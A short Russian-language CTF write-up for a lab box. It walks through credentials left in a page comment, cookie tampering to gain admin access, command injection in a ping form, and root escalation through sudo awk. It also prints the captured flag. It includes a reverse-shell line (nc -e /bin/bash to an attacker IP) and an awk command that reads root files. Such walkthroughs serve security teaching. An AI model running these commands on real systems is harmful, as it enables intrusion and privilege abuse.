Сервер с формой авторизации:
![alt text](image.png)
На странице есть комментарий с кредами:
![alt text](image-1.png)
 ``` 'test_user', 'Stg0nPassw0rd'```

При авторизации отвечает, что мы не админ:
![alt text](image-2.png)
При авторизации в куки передается имя, логин и проверка на админа:
![alt text](image-3.png)
Если заменить проверку **isAdmin** на **true**, т.е **"isAdmin";b:1;**
![alt text](image-4.png)
Проваливаемся до страницы с формой для пингования
![alt text](image-5.png)
Выполняем команду `ls` и там видим `root_flag.txt`, который может быть прочитан рутом
![alt text](image-6.png)
Выполнение команд происходит от `www-data` и файл ему недоступен
![alt text](image-7.png)
![alt text](image-8.png)
Выполняем **sudo –l**, там видим, что можно пользователю запустить **awk** от рута
![alt text](image-9.png)

Повышаем привилегии до рута через **awk**:

Либо поднимаем шелл:
```sudo awk 'BEGIN {system("nc -e /bin/bash 192.168.88.139 31337")}'```
![alt text](image-10.png)

Либо через ```sudo awk 'BEGIN {system("cat root_flag.txt")}'```
![alt text](image-11.png)
**Получаем флаг: RDGCTF{S0mn1teln0_No_0k3y**}
